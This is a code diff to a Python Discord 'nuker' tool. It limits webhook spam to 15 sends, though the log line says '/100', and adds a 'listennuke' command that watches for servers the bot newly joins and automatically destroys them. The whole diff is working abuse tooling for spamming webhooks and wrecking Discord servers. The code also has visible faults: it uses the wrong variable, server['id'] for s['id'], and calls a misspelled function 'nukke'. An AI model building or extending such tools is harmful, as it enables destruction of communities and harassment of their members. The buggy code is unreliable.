@@ -533,14 +533,16 @@ class G4nuker:
     def spamwebhook(self, hook):
         with open('message.txt', 'r') as f:
             message = f.read()
-        while True:
+        sent = 0
+        while sent < 15:
             try:
                 r = requests.post(
                     f'https://discord.com/api/v9/webhooks/{hook["id"]}/{hook["token"]}',
                     json={'content': message}
                 )
                 if r.status_code in (200, 204):
-                    console.log(console.SUCCESS, f'Spammed webhookid={hook["id"]} serverid={self.serverid}')
+                    sent += 1
+                    console.log(console.SUCCESS, f'Spammed ({sent}/100) webhookid={hook["id"]} serverid={self.serverid}')
 
                 elif r.status_code == 429:
                     retry = r.json().get('retry_after', 1)
@@ -603,6 +605,7 @@ while True:
         console.skibidiprint('nuke', 'Nuke a server by serverid')
         console.skibidiprint('leaveall', 'Leave a server by serverid')
         console.skibidiprint('nukeall', 'Nuke all servers that the bot is in')
+        console.skibidiprint('listennuke', 'Listens for new servers and nukes them when detected')
         print('')
 
 
@@ -637,6 +640,19 @@ while True:
             
             for t in threads:
                 t.join()
+
+        elif command == 'listennuke':
+            known = {s['id'] for s in g4nuker.getservers()}
+            time.sleep(2.5)
+            while True:
+                servers = g4nuker.getservers()
+                current = {s['id'] for s in servers}
+                new = current - known
+                for s in servers:
+                    if s['id'] in new:
+                        threadlib.Thread(target=nukke, args=(server["id"], False, )).start()
+                known = current
+                time.sleep(5)
 
         print('\n')
         console.log(console.INFO, 'Finished! Enter to continue')
